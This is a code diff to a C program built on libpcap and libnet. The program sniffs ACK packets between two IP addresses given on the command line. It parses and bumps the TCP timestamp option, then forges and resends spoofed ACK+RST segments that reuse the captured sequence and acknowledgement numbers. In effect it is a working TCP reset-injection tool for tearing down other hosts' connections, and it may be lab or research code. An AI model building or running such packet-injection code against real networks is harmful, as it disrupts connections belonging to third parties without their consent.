@@ -4,6 +4,8 @@
 
 #include <pcap.h>
 #include <libnet.h>
+//#include <arpa/inet.h> // ntohl
+
 
 uint8_t* find_ip_start_eth(const uint8_t *data, size_t len) {
     if (len < 14) {
@@ -44,6 +46,40 @@ uint8_t* find_ip_start(const uint8_t *data, size_t len, int dlt) {
             return NULL;
     }
 }
+
+int parse_tcp_timestamps(const uint8_t *tcp, size_t tcp_available,
+                         uint32_t *tsval, uint32_t *tsecr) {
+    if (tcp_available < 20) return 0;
+
+    uint8_t doff_words = tcp[12] >> 4;       // 32-bit words
+    size_t tcp_hlen = doff_words * 4;        // bytes
+    if (tcp_hlen < 20 || tcp_hlen > tcp_available) return 0;
+
+    size_t i = 20; // options start after fixed TCP header
+    while (i < tcp_hlen) {
+        uint8_t kind = tcp[i];
+
+        if (kind == 0) break;          // EOL
+        if (kind == 1) { i++; continue; } // NOP
+
+        if (i + 1 >= tcp_hlen) return 0;
+        uint8_t opt_len = tcp[i + 1];
+        if (opt_len < 2 || i + opt_len > tcp_hlen) return 0;
+
+        if (kind == 8 && opt_len == 10) {
+            uint32_t v, e;
+            memcpy(&v, tcp + i + 2, 4);
+            memcpy(&e, tcp + i + 6, 4);
+            *tsval = ntohl(v);
+            *tsecr = ntohl(e);
+            return 1;
+        }
+
+        i += opt_len;
+    }
+    return 0;
+}
+
 
 int main(int argc, char *argv[]) {
     // <source ip> <destination ip> <approach>
@@ -105,16 +141,17 @@ int main(int argc, char *argv[]) {
         if (strcmp(src_ip, argv[1]) == 0 && strcmp(dst_ip, argv[2]) == 0) {
             printf("Captured packet from %s to %s\n", src_ip, dst_ip);
             uint8_t *tcp = ip + ihl * 4;
+            // Get tcp header length
+            uint8_t tcp_hlen = tcp[12] >> 4;
+
             uint16_t src_port = (tcp[0] << 8) | tcp[1];
             uint16_t dst_port = (tcp[2] << 8) | tcp[3];
             printf("TCP flags: 0x%02x\n", tcp[13]);
             // Check if the ack flag is set, and only if (ack only is 0x10)
-            /*
-            if ((tcp[13] & 0x10) != 0 || (tcp[13] ^ 0x10) != 0) {
+            if (tcp[13] != 0x10) {
                 rc = pcap_next_ex(handle, &header, &data);
                 continue;
             }
-            */
             uint32_t seq = (tcp[4] << 24) | (tcp[5] << 16) | (tcp[6] << 8) | tcp[7];
             uint32_t ack = (tcp[8] << 24) | (tcp[9] << 16) | (tcp[10] << 8) | tcp[11];
             printf("Ack number: %u\n", ack);
@@ -134,6 +171,30 @@ int main(int argc, char *argv[]) {
                 // Should not happen since we got it from the packet
                 break;
             }
+            uint32_t tsval, tsecr;
+            if (parse_tcp_timestamps(tcp, header->caplen - (tcp - data), &tsval, &tsecr)) {
+                printf("TSval=%u TSecr=%u\n", tsval, tsecr);
+            }
+            uint8_t opts[12];
+            // Increment tsval by 100
+            tsval += 100;
+            uint32_t tsval_be = htonl(tsval);
+            uint32_t tsecr_be = htonl(tsecr);
+            /* NOP, NOP, kind=8, len=10, TSval(4), TSecr(4) */
+            opts[0] = 1;  // NOP
+            opts[1] = 1;  // NOP
+            opts[2] = 8;  // Timestamp option
+            opts[3] = 10; // length
+            memcpy(&opts[4], &tsval_be, 4);
+            memcpy(&opts[8], &tsecr_be, 4);
+
+            libnet_ptag_t tcp_opts_tag = libnet_build_tcp_options(opts, sizeof(opts), l, 0);
+            if (tcp_opts_tag == -1) {
+                fprintf(stderr, "libnet_build_tcp_options failed: %s\n", libnet_geterror(l));
+                break;
+            }
+            printf("Built TCP options with timestamp\n");
+            printf("Timestamp option: TSval=%u TSecr=%u\n", tsval, tsecr);
             // Recreate the same ACK packet that stats i still have to receive the bytes at ack
             libnet_ptag_t tcp_tag = libnet_build_tcp(
                 /*
@@ -144,7 +205,7 @@ int main(int argc, char *argv[]) {
                 dst_port,
                 seq, //seq
                 ack, //ack
-                TH_ACK, // Control flags
+                TH_ACK | TH_RST, // Control flags
                 window, // window
                 0, // checksum, autofill
                 0, // urgent pointer
@@ -183,7 +244,7 @@ int main(int argc, char *argv[]) {
                 break;
             }
             // Send 3 more times:
-            for (int i = 0; i < 3; i++) {
+            for (int i = 0; i < 4; i++) {
                 int bytes = libnet_write(l);
                 if (bytes == -1) {
                     fprintf(stderr, "libnet_write failed: %s\n", libnet_geterror(l));
